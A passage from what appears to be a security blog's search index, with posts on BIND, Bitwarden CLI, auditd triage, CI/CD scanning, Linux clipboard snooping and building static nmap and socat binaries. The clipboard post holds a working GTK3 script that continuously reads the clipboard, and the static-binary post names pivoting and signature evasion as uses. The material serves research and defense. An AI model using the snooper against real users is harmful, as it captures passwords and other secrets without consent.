a list of the client queries that named is currently handling (named.recursing)\n\nrndc dumpdb -all    # Get a snapshot of the current state of named's cache (named_dump.db)\n\nrndc querylog       # Toggle query logging on\n\nrndc trace 3        # Temporarily increase the level of server logging\n</code></pre> <p>Follow journal message with:</p> <pre><code>sudo journalctl -f -u bind  # or named, if you used named instead\n</code></pre> <p>Run <code>named</code> in the foreground with:</p> <pre><code>sudo named -g -L /tmp/named.log -u bind -c /etc/bind/named.conf\n</code></pre>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/","title":"bitwarden","text":"<p>Notes related to the bitwarden password manager.</p>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/#bitwarden-ssh","title":"bitwarden SSH","text":"<p>Bitwarden now has its own SSH agent. To enable it, go to File &gt; Settings &gt; Enable SSH agent.</p> <p>flatpak</p> <p>The flatpak version does not have SSH agent support at the time of updating this post.</p> <p>You can import existing SSH private keys, or even generate new ED25519 SSH keys.</p> <p>This does not have to interfere with your existing configuration. For example, configure_gnupg still writes the block below to the <code>~/.bashrc</code> file. However, the commands to use bitwarden's SSH agent are included in the comments so that:</p> <ul> <li>You can copy and paste them into a single terminal pane to leverage per-session</li> <li>You can easily comment out the gpg line and replace it to use bitwarden by default</li> </ul> <p>The configuration block is here for reference.</p> <pre><code>export GPG_TTY=\"$(tty)\"\nexport SSH_AUTH_SOCK=$(gpgconf --list-dirs agent-ssh-socket)\ngpgconf --launch gpg-agent\n\n# You can alternatively use Bitwarden's SSH agent, either temporarily per-session by copy and pasting\n# one of the lines below into your terminal, or here in bashrc by commenting out the gpg SSH_AUTH_SOCK.\n# File &gt; Settings &gt; Enable SSH agent\n# https://bitwarden.com/help/ssh-agent/#configure-bitwarden-ssh-agent\n#export SSH_AUTH_SOCK=/home/$USER/.bitwarden-ssh-agent.sock\n#export SSH_AUTH_SOCK=/home/$USER/snap/bitwarden/current/.bitwarden-ssh-agent.sock\n</code></pre>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/#bitwarden-cli","title":"bitwarden CLI","text":"<p>https://bitwarden.com/help/cli/</p> <p>Essentials: <pre><code>bw --help\nbw &lt;command&gt; --help\nbw login\nbw sync\nbw lock\nbw logout\n</code></pre></p>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/#programmatically-work-with-attachments","title":"Programmatically work with attachments","text":"<p>Without a way to do this from any of the GUI based clients, this will help you work with large numbers of attachments.</p> <p>WARNING: Do not do use <code>bw</code> if you have certain types of <code>PowerShell</code> logging enabled, for example transcript logging. Similar to enabling clipboard monitoring in Sysmon, you can potentially write your entire vault to disk in clear text.</p> <ul> <li>About Logging in PowerShell</li> <li>Script Tracing and Logging</li> <li>Transcript Logging</li> <li>About Script Blocks</li> <li>About PowerShell Profiles</li> </ul> <p>Script tracing and script block logging records the content of scripts themselves for auditing purposes. If a malicious script runs or if a script breaks something, what was executed exactly at the time of running that script is written to a file on disk.</p> <p>To avoid issues here, use variables for <code>bw</code> queries as demonstrated below. The most that can be retrieved in some cases is the name or title of an entry, or it's <code>itemid</code> which is acceptable. By doing this the variable runs the query each time the script is invoked rather than hardcoding the variable iteself. You'd need to have a valid login session to return any information.</p> <p>Transcript logging logs all of the text that appears in a terminal session window. This is what can potentially be dangerous if you're searching your vault from PowerShell while this setting is enabled. It can be enabled manually via the <code>Start-Transcript</code> cmdlet. This cmdlet can also be enabled in a profile to run every time you open PowerShell. Similar to bash profiles, this means it will invoke <code>Start-Transcript</code> anytime you run PowerShell.</p> <p>To check your PowerShell profile settings to see if this is enabled, review the locations mentioned here. Also check your registry to see if it's enabled there as well.</p>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/#retrieve-an-itemid","title":"Retrieve an <code>itemid</code>","text":"<pre><code>bw list items --search &lt;query&gt; --pretty | grep -P \"^\\s+\\\"id\\\":\\s\\\".*\\\",$\" | cut -d '\"' -f 4 | head -n1\n</code></pre> <p>Get the <code>itemid</code> of your entry named 'GitHub'</p> <p>If mutiple results are found, remove the regex to see what's returned and refine your query <pre><code>bw list items --search GitHub --pretty | grep -P \"^\\s+\\\"id\\\":\\s\\\".*\\\",$\" | cut -d '\"' -f 4 | head -n1\n</code></pre></p> <p>Put the query for the <code>itemid</code> into a variable</p> <p>This should be only one line, so double quoting <code>\"$()\"</code> is fine <pre><code>ITEM_ID=\"$(bw list items --search &lt;query&gt; --pretty | grep -P \"^\\s+\\\"id\\\":\\s\\\".*\\\",$\" | cut -d '\"' -f 4 | head -n1)\"\n</code></pre></p>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/#upload-files","title":"Upload files","text":"<p>You'll receive continuous responses to the console window for each attachment uploaded. <pre><code>for file in ../path/*.test; do bw create attachment --file \"$file\" --itemid \"$ITEM_ID\"; done\n</code></pre></p> <p>Confirm the files are listed under \"$ITEM_ID\" attachments <pre><code>bw get item \"$ITEM_ID\" --pretty\n</code></pre></p>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/#enumerate-attachments","title":"Enumerate attachments","text":"<p>We grep for any matches after <code>-A</code> the list of attachments, as other entries above the attachments line (which we don't want) could also match this regex</p> <p>10000 is arbitrary, just a guess to an upper limit on how many lines of json the attachments cover - update this if you need to</p> <p>DO NOT double quote the command substitution <code>$()</code>, this way each result is it's own line vs the list of results being a single string <pre><code>ATTACHMENT_IDS=$(bw get item \"$ITEM_ID\" --pretty | grep -A 10000 -Px \"^\\s+\\\"attachments\\\": \\[$\" | grep -Px \"^\\s+\\\"id\\\": \\\"\\w+\\\",$\" | grep -Fv '-' | cut -d '\"' -f 4)\n</code></pre></p>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/#download-attachments","title":"Download attachments","text":"<p>DO double quote the variable of each <code>\"$file\"</code>, or each line from the output above <pre><code>for file in $ATTACHMENT_IDS; do bw get attachment \"$file\" --itemid \"$ITEM_ID\"; done\n</code></pre></p>"},{"location":"blog/2024/05/02/simple-bitwarden-bitwarden/#delete-attachments","title":"Delete attachments","text":"<p>Same as downloading, with <code>delete</code> instead of <code>get</code> <pre><code>for file in $ATTACHMENT_IDS; do bw delete attachment \"$file\" --itemid \"$ITEM_ID\"; done\n</code></pre></p>"},{"location":"blog/2024/05/15/material-file-tree-triage-auditd-logs-with-check-auditd/","title":"Triage auditd logs with check-auditd","text":"<p>Recently updated to mirror and support <code>ausearch</code> arguments. This post showcases those changes and how the tool works.</p>"},{"location":"blog/2024/05/15/material-file-tree-triage-auditd-logs-with-check-auditd/#overview","title":"Overview","text":"<p>This script was written to help reduce time in reviewing systems running auditd for suspicious activity, or anomalies worth investigating further. Auditd logs are dense and rich in information, but the format is uniquely difficult to parse and read on its own.</p> <p>With check-auditd, logs are summarized and sorted based on frequency, and are printed in full color to highlight noteworthy data. There are three areas of focus for finding needles (splinters?) in the log haystack: command (binary or script) activity, files, and network activity.</p> <p>It's important to note that in order for this tool to pull data from the system, auditd must be logging that data to begin with. Check Neo23x0's auditd rules, or my fork here to get started. I also have an ansible role and a shell script to automate installing and setting up auditd, with laurel as an option.</p>"},{"location":"blog/2024/05/15/material-file-tree-triage-auditd-logs-with-check-auditd/#usage","title":"Usage","text":"<p>This section contains the full <code>-h</code>, <code>--help</code> manual.</p> <p>check-auditd.sh; a wrapper to summarize auditd logs.</p> <p>This script can do the following:</p> <ul> <li>Parse active auditd logs or a take a path to offline logs</li> <li>Prints a summary of UIDs appearing in events</li> <li>Search for command events matching a built in list of living-off-the-land binaries</li> <li>Match any entries of a specific [COMMAND]</li> <li>Show each unique command line string, sorted by frequency</li> <li>Shows log entries related to a [FILE], or a built in list of special files, sorted by frequency</li> <li>Summarizes logged network activity, such as dest port, dest IP, URL patterns, or applications making connections</li> <li>Network activity is also sorted by frequency</li> </ul> <p>An attempt is made to filter out command events using specific 'ausearch' and 'aureport' strings to prevent queries from flooding the results. Activity must already be logged by audit rules for this script to parse it out of a log file.</p> <pre><code>[*]Usage: ./check-auditd.sh -ts today [-if FILE] [OPTIONS...]\n</code></pre> <p>MAIN ARGUMENTS</p> <p><code>-ts</code>, <code>--start [start-date|start-time|keyword]</code></p> <p>The time frame to begin searching in logs. Example date: 01/01/2024. Example time: 18:00:00. You can also use keywords. Keywords include: now, recent, this-hour, boot, today, yesterday, this-week, week-ago, this-month, this-year, or checkpoint. Currently can only use either a date or a time, not both.</p> <p><code>-te</code>, <code>--end [end-date|end-time|keyword]</code></p> <p>The time frame to end searching in logs. If blank, default is 'now'. Like start-time, you can also use keywords. Currently can only use either a date or a time, not both.</p> <p><code>-if</code>, <code>--input</code></p> <p>Path to an offline audit log file.</p> <p><code>-h</code>, <code>--help</code></p> <p>Print this help menu.</p> <p>OPTIONAL ARGUMENTS</p> <p>Only one of these arguments will work at a time. If multiple are present, the first one wins.</p> <p><code>-ae</code>, <code>--all-events</code></p> <p>Display command, file, and network events.</p> <p><code>-ne</code>, <code>--net-events</code></p> <p>Only display network related information.</p> <p><code>-fe</code>, <code>--file-events</code></p> <p>Only display file related information.</p> <p><code>-ce</code>, <code>--cmd-events</code></p> <p>Only display command related information.</p> <p><code>-c</code>, <code>--command</code></p> <p>Match events that include <code>[COMMAND]</code>.</p> <p><code>-f</code>, <code>--file</code></p> <p>Match events that include <code>[FILE]</code>.</p>"},{"location":"blog/2024/05/15/material-file-tree-triage-auditd-logs-with-check-auditd/#next-steps","title":"Next Steps","text":"<p>There's still more that can be done to make this a universally usable tool.</p> <p>The built in lists for lolbins (<code>CMD_LIST</code>) and files (<code>FILE_LIST</code>) for example could be changed with arugments that allow you to bring your own list of strings to search for.</p> <p>One downside to this shell script is the <code>ausearch</code> and <code>aureport</code> binaries need to be installed on the system you're working from. This is not a huge issue since these binaries typically come with auditd, and logs can be taken offline. The next evolution of this tool will need to be a programming language that can undestand each field as an object, and return or analyze data from there.</p> <p>Laurel restructures auditd logs into json format, meaning they can be parsed effectively with <code>jq</code>. This has become a popular utility to have running on systems using auditd. Having the ability to parse raw audit.log files, and files generated by laurel would be a good milestone for this project.</p>"},{"location":"blog/2025/01/20/fontawesome-solid-gears-cicd/","title":"CI/CD","text":"<p>Continuous Integration, Continuous Deployment</p> <p>Improve the quality and security of your code using CI/CD workflows. This is best summarized in GitHub's Quickstart for Securing Repos.</p>"},{"location":"blog/2025/01/20/fontawesome-solid-gears-cicd/#dependabot","title":"Dependabot","text":"<p>The best way to understand this is to walk through the quickstart-guide. This has you fork the github.com/dependabot/demo repo, and run Dependabot on it by enabling it in the repo settings.</p> <p>This creates <code>.github/dependabot.yml</code> and targets languages based on those it detects in the repo. When you first enable it you may be asked to manually edit the <code>dependabot.yml</code> file.</p> <p>Dependabot is best suited for code that uses packages, or is built on other libraries and modules. There's less use here for static, self-contained scripting. However if you have a requirements file or version dependancies this is where it shines.</p>"},{"location":"blog/2025/01/20/fontawesome-solid-gears-cicd/#codeql-analysis","title":"CodeQL Analysis","text":"<p>Code Scanning</p> <p>You can configure code scanning to automatically identify vulnerabilities and errors in the code stored in your repository by using a CodeQL analysis workflow or third-party tool. Depending on the programming languages in your repository, you can configure code scanning with CodeQL using the default setup, in which GitHub automatically determines the languages to scan, query suites to run, and events that will trigger a new scan.</p> <p>Unlike the Dependabot demo, code scanning does not create any files within the repo itself. Instead it runs on top of GitHub separately, and like Dependabot, posts results and alerts to the Security tab of the repo.</p>"},{"location":"blog/2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/","title":"Clipboard Snooping (X11 and Wayland)","text":"<p>This post takes a look at what's possible in terms of \"clipboard snooping\" or stealing and setting content to the clipboard in both, X11 and Wayland display servers on Linux.</p> <p>Under Construction</p> <p>This page is still a work-in-progress, and will be updated over time.</p> <p>AI Usage</p> <p>AI was used to create and share code snippets, leading to the documentation and other public examples referenced in this section.</p> <p>First determine which display server you're using: <code>echo $XDG_SESSION_TYPE</code></p>"},{"location":"blog/2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/#pygobject-libraries","title":"PyGObject Libraries","text":"<p>The PyGObject bindings, if installed, allow you to interact with the GNOME / GTK clipboard contents.</p> <ul> <li>GTK4 Documentation: Getting Started</li> <li>GTK4 Documentation: Clipboard Example</li> <li>GTK3 Documentation: Clipboard Example</li> <li>GTK4 Python API Reference</li> <li>GTK3 Python API Reference</li> </ul> <p>On Ubuntu desktop, some of these may be available by default but can be installed with:</p> <pre><code>sudo apt install python3-gi python3-gi-cairo gir1.2-gtk-4.0\n</code></pre> <p>This is why you might not see <code>gi</code> listed under <code>python3 -m pip list</code>.</p>"},{"location":"blog/2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/#gtk4-first-attempt","title":"GTK4 First Attempt","text":"<p>This first proof of concept borrows lines from the example in the documentation and was tested on an Ubuntu 22.04 VM running GNOME + Wayland, from a python interpreter using GTK 4.0:</p> <pre><code>import gi\n\ngi.require_version('Gdk', '4.0')\ngi.require_version('Gtk', '4.0')\n\nfrom gi.repository import Gdk, Gtk\n\nclipboard = Gdk.Display.get_default().get_clipboard()\nclipboard.read_text_async(None, None)\n\n(process:012345): Gdk-CRITICAL **: 01:23:45.678: gdk_clipboard_read_text_async: assertion 'callback != NULL' failed\n# SNIP\n</code></pre> <p>At this point (and there were other attempts that went nowhere) it's clear this will require more than just importing the library and attempting to read from one of the clipboards. GTK 4.0 is event driven, operating on what are called signals and callbacks. Searching through both Google and ChatGPT returned references to both GTK4 and GTK3, with GPT-4o mentioning GTK3 will be simpler to work with to demo out this idea.</p>"},{"location":"blog/2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/#gtk3-second-attempt","title":"GTK3 Second Attempt","text":"<p>Using GTK 3.0 is much easier, extracting only what we need from an example similar to the one we just referenced in the GTK4 docs, led to a working block of code:</p> <pre><code># A nearly identical snippet was also suggested by GPT-4o, with minimal differences\nimport gi\n\ngi.require_version(\"Gtk\", \"3.0\")\nfrom gi.repository import Gtk, Gdk\n\nclipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)\n\n# Set text manually to test and verify this works at all\n# clipboard.set_text('This is a test.', -1)\n\ntext = clipboard.wait_for_text()\n\nprint(text)\n</code></pre> <p>On Ubuntu 22.04 running Wayland, this resulted in nothing being printed until manually setting the clipboard via this interpreter session by using <code>clipboard.set_text('This is a test.', -1)</code>. It's worth noting in those conditions (meaning Wayland) this doesn't suddenly set the clipboard for the desktop user either, it appears to be local to the interpreter session, in the terminal.</p> <p>Now what happens when we try this on Kali running XFCE + X11?</p> <pre><code>\u2514\u2500$ python3\nPython 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import gi\n...\n... gi.require_version(\"Gtk\", \"3.0\")\n... from gi.repository import Gtk, Gdk\n...\n... clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)\n...\n&gt;&gt;&gt; text = clipboard.wait_for_text()  # Paste this from our clipboard\n&gt;&gt;&gt; print(text)\ntext = clipboard.wait_for_text()      # This gets printed now, because it was in our clipboard\n&gt;&gt;&gt;                                   # Here, load a secret into your clipboard\n&gt;&gt;&gt; text = clipboard.wait_for_text()  # Type or up arrow to enter this again, updating the clipboard\n&gt;&gt;&gt;\n&gt;&gt;&gt; print(text)\nPassw0rd!                             # This successfully retrieves it\n</code></pre> <p>It turns out we can read the clipboard!</p>"},{"location":"blog/2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/#gtk3-gui-demo","title":"GTK3 GUI Demo","text":"<p>GUI Demo</p> <p>So sticking with GTK3, can we adapt the demo GUI application to visually verify this and show what a real \"windowed\" application can do?</p> <p>GPT-4o suggested using <code>GLib.timeout_add()</code> for the continuous \"read\" from the clipboard, which also seems to be alluded to in this stackoverflow answer for refreshing a window, which instead calls <code>GLib.timeout_add_seconds()</code>.</p> <pre><code>#!/usr/bin/env python3\n\n# clipboard_snooper.py\n#\n# Tested on:\n# - Ubuntu 22.04 (GNOME, Wayland)\n# - Kali 2025.2 (XFCE, X11)\n#\n# Proof of concept to demo clipboard snooping on Linux.\n# This was built using the example (linked below) in addition to\n# conversing with GPT-4o which suggested using GLib + timeout_add()\n# for the continuous \"read\" of the clipboard, and put together the\n# update_clipboard_text() function as an added example.\n#\n# https://python-gtk-3-tutorial.readthedocs.io/en/latest/clipboard.html\n\n\nimport gi\ngi.require_version(\"Gtk\", \"3.0\")\nfrom gi.repository import Gtk, Gdk, GLib\n\n\nclass ClipboardWindow(Gtk.Window):\n    def __init__(self):\n        super().__init__(title=\"Clipboard Snooping\")\n\n        grid = Gtk.Grid()\n\n        self.clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)\n        self.entry = Gtk.Entry()\n        # Removed the buttons here\n\n        grid.add(self.entry)\n        # Removed buttons here too\n\n        self.add(grid)\n\n        # This line sets the interval to try and read the clipboard once\n        # the window is active, every 100ms does it almost immediately\n        GLib.timeout_add(100, self.update_clipboard_text)\n\n    # This function continuously reads from the clipboard\n    def update_clipboard_text(self):\n        text = self.clipboard.wait_for_text()\n        if text is not None:\n            self.entry.set_text(text)\n        return True  # Causes this to execute continuously\n\n\nwin = ClipboardWindow()\nwin.connect(\"destroy\", Gtk.main_quit)\nwin.show_all()\nGtk.main()\n</code></pre> <p>Save this script, and run it with:</p> <pre><code>python3 ./clipboard_snooping.py\n</code></pre> <p>This will open a small graphical window with a single text field, which should immediately become populated with your clipboard contents.</p>"},{"location":"blog/2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/#results","title":"Results","text":"<p>So how does this work in different scenarios?</p> Dispaly Context Result X11 Inactive Window \u2705 Successfully read clipboard X11 Terminal Session \u2705 Successfully read clipboard Wayland Inactive Window \u26a0\ufe0f Cannot read clipboard until the window becomes active Wayland Terminal Session \u274c Cannot read clipboard outside of session Both Active Window \u2705 Successfully reads clipboard <p>Reading the host clipboard from a VM</p> <p>That last entry in the table for both even applies if you have an open, unlocked, VM window, where the last active application window within the VM is trying to read the clipboard contents. On an X11 host this also means the VM can steal clipboard contents silently in the background so long as that desktop session is still logged in, unlocked, and the app within the VM was left active.</p> <p>Ultimately on Wayland, these specific methods and attempts were not able to steal anything from the clipboard without some user interaction. This is likely due to Wayland's security architecture, so more research is needed to identify exactly how it's doing the isolation.</p>"},{"location":"blog/2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/#detection","title":"Detection","text":"<p>Under Construction</p> <p>This section in particular is still a work-in-progress, and will be updated over time.</p> <ul> <li>Both, the SOCFortress Team's SysmonForLinux rules and Neo23x0's auditd rules only see up to the execution of the source application, in this case python3</li> <li>Neither <code>[sudo] busctl monitor</code> or <code>[sudo] dbus-monitor --session</code> worked to reveal this activity</li> <li>pspy?</li> </ul>"},{"location":"blog/2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/","title":"Compile Static Binaries","text":"<p>Creating static binaries easily, repeatably, and on your own.</p> <p>Each section was originally part of other notes taken over the last few years. Initially these were put together to build static binaries when competing in a live cyber attack-defense event, where systems are already assumed to be compromised in some way. Bringing your own static binaries along with uac is a really effective IR technique.</p> <p>Eventually static builds came up again, recently with pspy, just to understand golang and using Docker to build software. This is an effort to centralize all of these notes for public reference.</p> <p>Why?</p> <p>The first time ever using naabu and seeing how it could work after being moved to other systems, was what prompted creating the notes in this post. It's also a great way to learn more about reviewing and modifying code.</p> <ol> <li>Binaries linked to shared libraries will often only run on the system(s) they were compiled on. Static binaries bake in those dependencies and have a level of portability to them.</li> <li>Static binaries of common tools are often most useful for pivoting, where you have shell access to a system and you need the capability to do something local to that machine without the ability to compile anything on it.</li> <li>Customization and signature evasion</li> <li>Compiling for other architectures and systems</li> <li>Most importantly, to trust the tool. For some tools, you can pull the source directly from the Linux repositories which already have to be trusted to some degree. Almost none of those projects release static binaries by default, and this is easier than reverse engineering existing unofficial binaries from third-parties if any exist.</li> </ol>"},{"location":"blog/2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/#getting-started","title":"Getting Started","text":"<p>Work in Progress</p> <p>The notes in this post as of right now are close to their original state, and need to be updated to use musl and Docker in the build process.</p> <p>These resources are necessary starting points to succeed here.</p> <ul> <li>musl-libc</li> <li>andrew-d/static-binaries</li> <li>How to compile a static binary</li> <li>Docker</li> <li>Kali Linux Source Repos</li> </ul> <p>The andrew-d/static-binaries repository has a great approach that's fairly easy to understand and learn from. Familiarity with docker, CICD, and devops in general also helps; a lot of modern projects will include a dockerfile among other build tools to help you compile things from source. Part of the purpose of this post is to help unwind and determine how these are working, to modify and use them, and ultimately build our own.</p> <p>Using makefiles </p> <p>Essentially, these are the steps you'll encounter with makefiles:</p> <pre><code>./configure # There's often a configuration shell script\nmake        # Compiles the code\nmake clean  # Revert project directory to state before running make, great if you encounter errors or want to reconfigure and build again\n</code></pre> <p>Handling Compile Errors</p> <p>When handling errors note:</p> <ul> <li>Which header file, or library, is causing the error(s)</li> <li>Does it require different dependancies</li> <li>Does something specific in the configuration of the build need to be changed</li> </ul> <p>musl-libc </p> <p>What uses musl?</p> <p>In addition to the andrew-d/static-binaries project, threathunters-io/laurel also uses musl to build static binaries for laurel.</p> <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/#openssl","title":"openssl","text":"<p>OpenSSL is a protocol implementation and library for cryptography. Specifically from the project README:</p> <p>OpenSSL is a robust, commercial-grade, full-featured Open Source Toolkit for the TLS (formerly SSL), DTLS and QUIC protocols.</p> <p>The protocol implementations are based on a full-strength general purpose cryptographic library, which can also be used stand-alone. Also included is a cryptographic module validated to conform with FIPS standards.</p> <p>OpenSSL is descended from the SSLeay library developed by Eric A. Young and Tim J. Hudson.</p> <p>The official Home Page of the OpenSSL Project is www.openssl.org.</p> <p>These are the main resources we'll need for reference to build OpenSSL:</p> <ul> <li>openssl.org</li> <li>openssl-library.org / github.com/openssl/openssl</li> <li>Compilation Options</li> <li>andrew-d/static-binaries Example for Compiling nmap</li> <li>OpenSSL PGP Signing Key Information</li> <li>OpenSSL PGP Signing Keys</li> </ul> <p>Where to download from?</p> <p>The downloads on https://openssl-library.org/source/ point to https://github.com/openssl/openssl/releases.</p> <p>Clone the library source, detached signature, checksums, and finally obtain the signing key to verify the file integrity.</p> <pre><code># Install jq, if you want to use this block\nif ! command -v jq; then sudo apt update; sudo apt install -y jq; fi\n\n# Obtain the latest release info\ngh_release_info=\"$(curl -Lf https://api.github.com/repos/openssl/openssl/releases/latest)\"\nlatest_version=\"$(echo \"$gh_release_info\" | jq -r '.tag_name')\"\n\n# Download the files\ncurl -LfO \"https://github.com/openssl/openssl/releases/download/${latest_version}/${latest_version}.tar.gz\"\ncurl -LfO \"https://github.com/openssl/openssl/releases/download/${latest_version}/${latest_version}.tar.gz.asc\"\ncurl -LfO \"https://github.com/openssl/openssl/releases/download/${latest_version}/${latest_version}.tar.gz.sha256\"\n\n# Obtain the signing key\n# pub   rsa4096/0x216094DFD0CB81EF 2024-04-08 [SC] [expires: 2026-04-08]\n#       Key fingerprint = BA54 73A2 B058 7B07 FB27  CF2D 2160 94DF D0CB 81EF\n# uid                   [ unknown] OpenSSL &lt;openssl@openssl.org&gt;\ngpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys 'BA5473A2B0587B07FB27CF2D216094DFD0CB81EF'\n\n# Integrity checks\nsha256sum -c \"${latest_version}.tar.gz.sha256\" --ignore-missing\ngpg --verify \"${latest_version}.tar.gz.asc\" \"${latest_version}.tar.gz\"\n\n# Build the library\ntar -xvzf \"${latest_version}.tar.gz\"\ncd \"${latest_version}\"\n./Configure LDFLAGS=-static no-shared\nmake\n</code></pre> <p>This will result in a static binary for OpenSSL under <code>apps/openssl</code>,</p>"},{"location":"blog/2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/#nmap","title":"nmap","text":"<p>OpenSSL Dependancy</p> <p>You may want to compile a static version of OpenSSL first and point to it with <code>--with-openssl=&lt;directoryname&gt;</code> when building a static nmap binary.</p> <ul> <li>nmap: Release and Build Information</li> <li>nmap: Compile Instructions</li> <li>andrew-d/static-binaries Example for Compiling nmap</li> <li>nmap: Release Archive</li> <li>nmap: Detached Signatures</li> <li>nmap: Verifying archive integrity</li> <li>nmap GitHub Issue 2648: Fails to build with lua 5.4.6</li> <li>nmap GitHub Issue 145: --with-liblua=included fix</li> <li>nmap GitHub Issue 425: FEATURE REQUEST: single-exe 'portable' nmap</li> <li>askubuntu: Decompress an .xz tarball in one command</li> </ul> <p> Obtain and verify source (nmap.org)</p> <pre><code># Set which versions you'd like to compile\nnmap_version='7.97'\nopenssl_version='3.5.0'\n\n# Download the source archive, and signature information\nwget \"https://nmap.org/dist/nmap-${nmap_version}.tar.bz2\"\nwget \"https://nmap.org/dist/sigs/nmap-${nmap_version}.tar.bz2.asc\"\nwget \"https://nmap.org/dist/sigs/nmap-${nmap_version}.tar.bz2.digest.txt\"\n\n# If you don't already have nmap's signing key, you'll see the abbreviated signature you can use to obtain it\n# Check these places to verify the signature fingerprint:\n# https://nmap.org/book/install.html#inst-integrity\n# https://svn.nmap.org/nmap/docs/nmap_gpgkeys.txt\n# https://keyserver.ubuntu.com/pks/lookup?search=436D66AB9A798425FDA0E3F801AF9F036B9355D0&amp;fingerprint=on&amp;op=index\n#\n# pub   dsa1024/0x01AF9F036B9355D0 2005-04-24 [SC]\n#       Key fingerprint = 436D 66AB 9A79 8425 FDA0  E3F8 01AF 9F03 6B93 55D0\n# uid                   [ unknown] Nmap Project Signing Key (http://www.insecure.org/)\n# sub   elg2048/0x44AEF5D7A50A6A94 2005-04-24 [E]\n\n# Obtain the key with:\ngpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys '436D 66AB 9A79 8425 FDA0 E3F8 01AF 9F03 6B93 55D0'\n\n# Verify:\ngpg --verify \"nmap-${nmap_version}.tar.bz2.asc\" \"nmap-${nmap_version}.tar.bz2\"\n\n# Compare hashes:\ncat \"nmap-${nmap_version}.tar.bz2.digest.txt\"\ngpg --print-md sha256 \"nmap-${nmap_version}.tar.bz2\"\n</code></pre> <p> Obtain and verify source (apt)</p> <p>This may not work, try obtaining nmap from nmap.org if it fails.</p> <p>Instructions in Kali</p> <p>Interestingly, as of Kali in 2025 and possibly earlier, you'll get a message for some packages when downloading the source code via <code>apt</code>:</p> <pre><code>$ apt source nmap\nNOTICE: 'nmap' packaging is maintained in the 'Git' version control system at:\nhttps://gitlab.com/kalilinux/packages/nmap.git\nPlease use:\ngit clone https://gitlab.com/kalilinux/packages/nmap.git\nto retrieve the latest (possibly unreleased) updates to the package.\n</code></pre> <pre><code># Add the source repo in Kali, adjust this based on the Linux distro\necho \"deb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware\" | sudo tee -a /etc/apt/sources.list\nsudo apt update\n\n# Download the source code\ncd ~/Download\napt source nmap\nsudo apt-get build-dep nmap\n\n# Check the gpg and sha256 signatures:\ngpg --verify \"nmap_${nmap_version}+dfsg1-1kali1.dsc\"\n# If you're missing the key, get it from the ubuntu keyserver and verify again\ngpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys '&lt;key-id&gt;'\ngpg --verify \"nmap_${nmap_version}+dfsg1-1kali1.dsc\"\ncat \"nmap_${nmap_version}+dfsg1-1kali1.dsc\" # Take the signature for the archive you want to verify\nsha256sum nmap_&lt;version&gt;.tar.xz | grep &lt;sha256sum&gt;\n</code></pre> <p>Prepare and compile nmap:</p> <pre><code># If you obtained it from apt:\ntar -xf \"nmap_${nmap_version}+dfsg1.orig.tar.xz\"\n# If you obtained it from nmap.org:\nbzip2 -cd \"nmap-${nmap_version}.tar.bz2\" | tar xvf -\n\ncd \"nmap-${nmap_version}\"\n\n# Don't build the libpcap.so file, this was discovered from andrew-d/static-binaries\nsed -i -e 's/shared\\: /shared\\: #/' libpcap/Makefile\n\n./configure --help # See the configuration options\n./configure LDFLAGS=-static --with-liblua=included --with-openssl=../openssl-${openssl_version} --with-pcap=linux --without-ndiff --without-zenmap --withou-nmap-update\nmake -j4\n</code></pre> <p>If you encounter an error and need to attempt another build be sure to run:</p> <pre><code>make clean\n</code></pre>"},{"location":"blog/2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/#socat","title":"Socat","text":"<ul> <li>Debian Package</li> <li>Kali Linux Source Repos</li> <li>How to compile a static binary</li> </ul> <p>Add the Kali source repo:</p> <pre><code>echo \"deb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware\" | sudo tee -a /etc/apt/sources.list\nsudo apt update\n</code></pre> <p>Download the source code</p> <pre><code>cd ~/Download\napt source socat\nsudo apt-get build-dep socat\n</code></pre> <p>Check the gpg and sha256 signatures:</p> <pre><code>gpg --verify socat_1.7.4.4-2.dsc\n# If you're missing the key, get it from the ubuntu keyserver and verify again\ngpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys '&lt;key-id&gt;'\ngpg --verify socat_1.7.4.4-2.dsc\ncat socat_1.7.4.4-2.dsc # Take the signature for the archive you want to verify\nsha256sum socat_&lt;version&gt;.tar.gz | grep &lt;sha256sum&gt;\n</code></pre> <p>Compile a static binary:</p> <pre><code>rm -rf socat_&lt;version&gt; # We want to unpack and use files from the archive we verified hashes on\ntar -xzf socat_&lt;version&gt;.tar.gz\ncd socat_&lt;version&gt;\n./configure LDFLAGS=-static # This works here, while --enable-static does not\nmake\n</code></pre> <p>After some errors and warnings, you'll have a static <code>socat</code> binary for transfer.</p>"},{"location":"blog/2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/#pspy","title":"pspy","text":"<p>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux 